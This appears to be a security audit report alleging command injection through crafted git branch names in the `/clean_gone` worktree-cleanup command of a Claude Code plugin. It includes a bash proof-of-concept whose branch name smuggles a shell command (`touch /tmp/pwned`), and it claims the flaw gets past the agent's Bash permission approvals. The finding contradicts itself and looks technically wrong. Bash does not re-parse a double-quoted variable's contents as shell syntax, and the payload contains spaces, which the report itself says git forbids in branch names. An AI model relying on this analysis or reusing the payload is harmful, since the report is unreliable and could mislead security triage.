### Title
Command injection via unsanitized git branch names in `clean_gone.md` worktree cleanup script - ([File: plugins/commit-commands/commands/clean_gone.md])

### Summary
The `/clean_gone` slash command instructs Claude Code to run a bash pipeline that extracts `[gone]` branch names from `git branch -v` and interpolates them, unquoted against shell metacharacters, into a double-quoted `grep` pattern inside a command substitution. Git branch names may legally contain shell-special characters such as `"`, `;`, `` ` ``, `$()`, and `#` (git's `check-ref-format` only forbids space, control chars, and `~^:?*[\`), so a branch created by an unprivileged contributor with a crafted name can break out of the double-quoted string and inject arbitrary shell commands that execute when a victim later runs `/clean_gone`.

### Finding Description
The script reads:
```bash
git branch -v | grep '\[gone\]' | sed 's/^[+* ]//' | awk '{print $1}' | while read branch; do
  worktree=$(git worktree list | grep "\\[$branch\\]" | awk '{print $1}')
  ...
  git worktree remove --force "$worktree"
  git branch -D "$branch"
done
``` [1](#0-0) 

`$branch` is embedded unescaped inside a double-quoted `grep` pattern (`"\\[$branch\\]"`) within a `$(...)` command substitution. Because git ref-name rules do not forbid `"`, `;`, backticks, `$()`, or `#` in a branch name, an attacker who can create a branch with a crafted name (e.g. via a normal PR/branch push to a repo the victim fetches and checks out) can include a payload such as:
```
pwn"; touch /tmp/pwned; #
```
When the victim's local tracking branch for that ref becomes `[gone]` (remote deleted) and they invoke `/clean_gone`, the resulting substituted command becomes:
```
worktree=$(git worktree list | grep "\[pwn"; touch /tmp/pwned; #\]" | awk '{print $1}')
```
which terminates the intended `grep` string early and executes `touch /tmp/pwned` (or any attacker command) as part of the single Bash tool invocation the user already approved for "cleaning up gone branches." The final `git branch -D "$branch"` line is quoted correctly for word-splitting/globbing but the earlier command-substitution line is the injection point since it, too, will inject `$branch` into a shell command position before the outer `"..."` closes.

Existing safeguards do not stop this:
- The command has no `allowed-tools` restriction and no argument/branch-name allowlist or sanitization is performed anywhere in the file.
- Claude Code's Bash permission system evaluates and can auto-approve the overall multi-line script as a single unit (e.g., under `Bash(git *)`-style allow rules or once the user approves the compound command); it does not re-validate the *runtime* content that a `while read` loop substitutes from git metadata, so approving execution of this script does not protect against the injected payload executing inside it.
- No code in this file quotes/escapes `$branch` before interpolating it into the `grep` pattern.

### Impact Explanation
An attacker who can get a maliciously-named branch fetched/checked out in the victim's repository (a normal, low-privilege action — e.g., opening a branch/PR with a crafted name) can achieve arbitrary command execution on the victim's machine the next time the victim runs the bundled `/clean_gone` plugin command, once that branch becomes `[gone]`. This is an unauthorized command execution / trust-boundary bypass: the user only intends to approve "delete stale gone branches and worktrees," but the actual executed shell logic can run arbitrary attacker-chosen commands, bypassing the user's understanding of what they approved.

### Likelihood Explanation
Requires: (1) attacker creates/pushes a branch with a crafted name containing `"`, `;`, or similar (fully permitted by git), (2) victim fetches and locally checks out that branch (a common workflow for reviewing contributions), (3) the upstream branch is later deleted so it shows as `[gone]` locally, and (4) the victim has the `commit-commands` plugin installed and runs `/clean_gone`. Steps 1–3 are ordinary git/PR review workflow actions requiring no elevated privilege; step 4 depends on plugin installation and command usage, making this feasible but conditioned on the plugin being present and invoked.

### Recommendation
Quote/sanitize `$branch` and `$worktree` before use in any pattern or substitution, and avoid feeding attacker-controlled ref names into `grep` patterns built via string interpolation. Prefer `git worktree list --porcelain` combined with `git for-each-ref` and safe programmatic matching (e.g., compare paths/branch fields exactly using `[ "$field" = "$branch" ]` rather than substituting `$branch` into a regex/string), or use `printf '%s\n' "$branch" | grep -F -- "$branch"` with `-F`/`--` to prevent regex and option injection, and never place unescaped variables inside a double-quoted external command string that itself gets shell-evaluated.

### Proof of Concept
Integration test plan (bash):
```bash
# Setup: create a bare "remote" and a working repo
git init --bare remote.git
git clone remote.git victim && cd victim

# Attacker step: create a branch with an injection payload as its name
git checkout -b 'pwn"; touch /tmp/pwned; #'
git push origin 'pwn"; touch /tmp/pwned; #'

# Victim fetches/tracks it, then upstream branch is deleted
git fetch origin
cd .. && rm -rf remote.git && git init --bare remote.git   # simulate remote branch deletion
cd victim && git fetch --prune origin

# Confirm branch shows as [gone]
git branch -v   # expect: pwn"; touch /tmp/pwned; # ... [gone]

# Execute the exact script body from clean_gone.md
bash -c '
git branch -v | grep "\[gone\]" | sed "s/^[+* ]//" | awk "{print \$1}" | while read branch; do
  worktree=$(git worktree list | grep "\\[$branch\\]" | awk "{print \$1}")
  echo "worktree=$worktree"
  git branch -D "$branch"
done
'

# Assertion: /tmp/pwned exists, proving injected command executed
test -f /tmp/pwned && echo "VULNERABLE: command injection executed" || echo "not reproduced"
```
Expected result: `/tmp/pwned` is created, demonstrating that the crafted branch name caused arbitrary command execution outside the intended `git branch -D` / `git worktree remove` operations.
